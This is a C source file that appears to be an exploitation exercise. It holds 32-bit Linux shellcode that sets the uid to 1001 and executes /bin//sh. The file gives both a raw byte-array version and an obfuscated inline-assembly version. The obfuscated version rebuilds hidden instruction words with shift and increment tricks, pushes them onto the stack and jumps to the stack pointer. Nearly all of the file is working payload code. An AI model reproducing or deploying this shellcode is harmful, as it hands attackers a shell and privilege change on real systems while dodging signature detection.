#include <stdio.h>

char shellcode_original[] = 
  "\x55\x89\xe5\x31"
  "\xc0\x31\xdb\x31"
  "\xc9\xb0\x46\x66"
  "\xbb\xe9\x03\x66" //adjust uid (03e9 = 1001)
  "\xb9\xe9\x03\xcd" //adjust uid (03e9 = 1001)
  "\x80\x31\xc0\x50"
  "\x68\x2f\x2f\x73"
  "\x68\x68\x2f\x62"
  "\x69\x6e\x89\xe3"
  "\x31\xc9\x31\xd2"
  "\xb0\x0b\xcd\x80"
  ;

char shellcode[] =
"\x55"
"\x89\xe5"
"\xb8\xd8\x85\x66\xc0"
"\xd1\xe0"         
"\x50"            
"\x68\x31\xc9\x31\xd2"
"\x68\x69\x6e\x89\xe3"
"\x68\x68\x68\x2f\x62"
"\x68\x68\x2f\x2f\x73"
"\x68\x80\x31\xc0\x50"
"\xb8\xdd\xf4\x81\xe6"
"\xd1\xe0"         
"\x48"            
"\x50"            
"\xb8\xdd\xf4\x01\x33"
"\xd1\xe0"         
"\x40"            
"\x50"            
"\x68\xc9\xb0\x46\x66"
"\xb8\xe0\x98\xed\x18"
"\xd1\xe0"         
"\x50"            
"\x68\x55\x89\xe5\x31"
"\xff\xe4"         
  ;

void call_asm(){
  asm(
      "fldz \n"
      "fstenv %ss:-0xc(%esp) \n"
      "pop %eax \n"
      //"push $0x80cd0bb0 \n" //obfuscate
      "mov $0xc06685d8, %eax \n"
      "shl %eax \n"
      "push %eax \n"

      "push $0xd231c931 \n"
      "push $0xe3896e69 \n"
      "push $0x622f6868 \n"
      "push $0x732f2f68 \n"
      "push $0x50c03180 \n"

      // "push $0xcd03e9b9 \n" //adjust uid (03e9 = 1001) //obfuscate
      "mov $0xe681f4dd , %eax \n"
      "shl %eax \n"
      "dec %eax \n"
      "push %eax \n"

      // "push $0x6603e9bb \n" //adjust uid (03e9 = 1001) //obfuscate
      "mov $0x3301f4dd , %eax \n"
      "shl %eax \n"
      "inc %eax \n"
      "push %eax \n"

      "push $0x6646b0c9 \n"
      
      // "push $0x31db31c0 \n" //obfuscate
      "mov $0x18ed98e0 , %eax \n"
      "shl %eax \n"
      "push %eax \n"

      "push $0x31e58955 \n"
      "jmp *%esp \n"
      );
}

int main(void) {
  //char cmd[256];
  //sprintf(cmd,"cat /proc/%d/maps",(int)getpid());
  //system(cmd);

  call_asm();

  //(*(void(*)()) shellcode)();

  printf("shellcode fail!\n");

  return 0;
}
